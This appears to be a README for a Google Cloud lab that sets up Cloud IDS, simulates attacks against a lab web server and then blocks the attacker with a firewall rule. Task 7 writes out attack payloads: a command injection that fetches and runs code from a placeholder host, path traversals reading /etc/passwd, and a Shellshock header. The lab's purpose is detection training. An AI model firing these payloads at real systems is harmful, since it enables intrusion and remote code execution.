# Cloud IDS Lab: Threat Detection & Incident Response on Google Cloud

## Overview

This lab walks through deploying **Cloud Intrusion Detection System (Cloud IDS)** — a next-generation threat detection service for intrusions, malware, spyware, and command-and-control attacks. I simulated multiple attacks, reviewed them in details and blocked them by creating high-priority (1) firewall rule against the source IP (attacker's VM) using gcloud commands.

---

## Architecture

```
VPC: cloud-ids
└── Subnet: cloud-ids-useast1 (192.168.10.0/24, us-east1)
    ├── server VM       (192.168.10.20) ← nginx web server, mirrored to IDS
    └── attacker VM     (192.168.10.10) ← simulates attack traffic

Cloud IDS Endpoint (us-east1-b)
└── Packet Mirroring Policy → mirrors cloud-ids-useast1 subnet traffic

Cloud NAT + Cloud Router → outbound internet for VMs (no public IPs)
```

---

## Objectives

- Build a Google Cloud VPC networking environment
- Create a Cloud IDS endpoint
- Deploy two VMs via `gcloud` CLI
- Configure a Cloud IDS packet mirroring policy
- Simulate attack traffic at varying severity levels
- Review threat details in the Cloud console and Cloud Logging
- Block the attacker with a high-priority firewall rule
- Verify the defense by re-running the attack

---

## Prerequisites

- Access to a Google Cloud project with billing enabled
- `gcloud` CLI (available in Cloud Shell)
- The following APIs enabled (see Task 1):
  - `servicenetworking.googleapis.com`
  - `ids.googleapis.com`
  - `logging.googleapis.com`

---

## Setup

### Activate Cloud Shell

Open the Google Cloud console and click the **Cloud Shell** icon in the top-right toolbar, then click **Continue**.

### Set Project ID

```bash
export PROJECT_ID=$(gcloud config get-value project | sed '2d')
```

---

## Task 1 — Enable APIs

```bash
gcloud services enable servicenetworking.googleapis.com --project=$PROJECT_ID
gcloud services enable ids.googleapis.com --project=$PROJECT_ID
gcloud services enable logging.googleapis.com --project=$PROJECT_ID
```

---

## Task 2 — Build the Networking Environment

```bash
# Create VPC
gcloud compute networks create cloud-ids --subnet-mode=custom

# Add subnet for mirrored traffic
gcloud compute networks subnets create cloud-ids-useast1 \
  --range=192.168.10.0/24 \
  --network=cloud-ids \
  --region=us-east1

# Configure private services access
gcloud compute addresses create cloud-ids-ips \
  --global \
  --purpose=VPC_PEERING \
  --addresses=10.10.10.0 \
  --prefix-length=24 \
  --description="Cloud IDS Range" \
  --network=cloud-ids

# Create private connection
gcloud services vpc-peerings connect \
  --service=servicenetworking.googleapis.com \
  --ranges=cloud-ids-ips \
  --network=cloud-ids \
  --project=$PROJECT_ID
```

---

## Task 3 — Create a Cloud IDS Endpoint

> **Note:** Endpoint creation takes approximately 20 minutes.

```bash
# Create endpoint (async)
gcloud ids endpoints create cloud-ids-east1 \
  --network=cloud-ids \
  --zone=us-east1-b \
  --severity=INFORMATIONAL \
  --async

# Check status (repeat until STATE: READY)
gcloud ids endpoints list --project=$PROJECT_ID
```

---

## Task 4 — Firewall Rules and Cloud NAT

```bash
# Allow HTTP (TCP 80) and ICMP to the server VM
gcloud compute firewall-rules create allow-http-icmp \
  --direction=INGRESS \
  --priority=1000 \
  --network=cloud-ids \
  --action=ALLOW \
  --rules=tcp:80,icmp \
  --source-ranges=0.0.0.0/0 \
  --target-tags=server

# Allow SSH via Identity-Aware Proxy
gcloud compute firewall-rules create allow-iap-proxy \
  --direction=INGRESS \
  --priority=1000 \
  --network=cloud-ids \
  --action=ALLOW \
  --rules=tcp:22 \
  --source-ranges=35.235.240.0/20

# Create Cloud Router
gcloud compute routers create cr-cloud-ids-useast1 \
  --region=us-east1 \
  --network=cloud-ids

# Configure Cloud NAT
gcloud compute routers nats create nat-cloud-ids-useast1 \
  --router=cr-cloud-ids-useast1 \
  --router-region=us-east1 \
  --auto-allocate-nat-external-ips \
  --nat-all-subnet-ip-ranges
```

---

## Task 5 — Create Virtual Machines

```bash
# Server VM (nginx web server)
gcloud compute instances create server \
  --zone=us-east1-b \
  --machine-type=e2-medium \
  --subnet=cloud-ids-useast1 \
  --no-address \
  --private-network-ip=192.168.10.20 \
  --metadata=startup-script='#!/bin/bash
sudo apt-get update
sudo apt-get -qq -y install nginx' \
  --tags=server \
  --image=debian-11-bullseye-v20240709 \
  --image-project=debian-cloud \
  --boot-disk-size=10GB

# Attacker VM
gcloud compute instances create attacker \
  --zone=us-east1-b \
  --machine-type=e2-medium \
  --subnet=cloud-ids-useast1 \
  --no-address \
  --private-network-ip=192.168.10.10 \
  --image=debian-11-bullseye-v20240709 \
  --image-project=debian-cloud \
  --boot-disk-size=10GB
```

### Prepare the Server

SSH into the server via IAP and create a test malware file:

```bash
gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap
```

```bash
# Inside the server VM
sudo systemctl status nginx
cd /var/www/html/
sudo touch eicar.file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
exit
```

---

## Task 6 — Create Packet Mirroring Policy

Wait until the IDS endpoint is `READY`, then attach the mirroring policy:

```bash
# Confirm endpoint is ready
gcloud ids endpoints list --project=$PROJECT_ID | grep STATE

# Get the forwarding rule
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 \
  --zone=us-east1-b \
  --format="value(endpointForwardingRule)")

# Create and attach packet mirroring policy
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
  --region=us-east1 \
  --collector-ilb=$FORWARDING_RULE \
  --network=cloud-ids \
  --mirrored-subnets=cloud-ids-useast1

# Verify
gcloud compute packet-mirrorings list
```

---

## Task 7 — Simulate Attack Traffic

SSH into the attacker VM:

```bash
gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
```

Run the following curl commands to simulate attacks at escalating severity levels:

```bash
# Low severity
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"

# Medium severity
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file

# High severity
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd

# Critical severity
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
```

```bash
exit
```


<img width="975" height="476" alt="image" src="https://github.com/user-attachments/assets/3203e842-4b7f-429b-987a-67f9d524deb8" />

---

## Task 8 — Review Threats in Cloud Console

1. Navigate to **Network Security > IDS Dashboard** in the Cloud console.
2. Click **View top threats** in the Top threats section.
3. Locate **Bash Remote Code Execution Vulnerability**, click **View more > View threat details**.
4. To view logs: click **IDS Threats**, locate the same threat, then click **More > View threat logs**.

> **Note:** Multiple entries with the same threat name are expected — both inbound (server) and outbound (client) packets are mirrored, producing separate session IDs.

---

<img width="975" height="492" alt="image" src="https://github.com/user-attachments/assets/6aa8b28a-805a-44b9-991a-9c7b3fe6ae3f" />


## Task 9 — Manual Incident Response

Identify the attacker's source IP from the IDS Dashboard (typically `192.168.10.10`), then block it with a high-priority deny rule:

```bash
# Replace [ATTACKER_IP] with the source IP from the IDS Dashboard
gcloud compute firewall-rules create cymbal-emergency-block \
  --direction=INGRESS \
  --priority=1 \
  --network=cloud-ids \
  --action=DENY \
  --rules=all \
  --source-ranges=[ATTACKER_IP]/32 \
  --enable-logging

# Verify the rule was created
gcloud compute firewall-rules list
```

---

## Task 10 — Verify the Defense

Re-run the critical severity attack to confirm it is now blocked:

```bash
gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
```

```bash
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
```

The command should time out or fail to connect.

To confirm the block in Cloud Logging, navigate to **Logging > Logs Explorer** and search:

```
jsonPayload.disposition="DENIED"
```

You should see a log entry confirming the firewall rule blocked the attack.

---

## Summary

| Task | What Was Done |
|------|---------------|
| 1 | Enabled required GCP APIs |
| 2 | Created VPC, subnet, and private services access |
| 3 | Deployed a Cloud IDS endpoint |
| 4 | Configured firewall rules and Cloud NAT |
| 5 | Deployed server and attacker VMs |
| 6 | Created and attached a packet mirroring policy |
| 7 | Simulated low → critical severity attack traffic |
| 8 | Reviewed threats in Cloud IDS Dashboard and Cloud Logging |
| 9 | Blocked the attacker IP with a high-priority firewall rule |
| 10 | Verified the defense via re-attack and log inspection |

## Note: Lab is from Google Cloud Skills
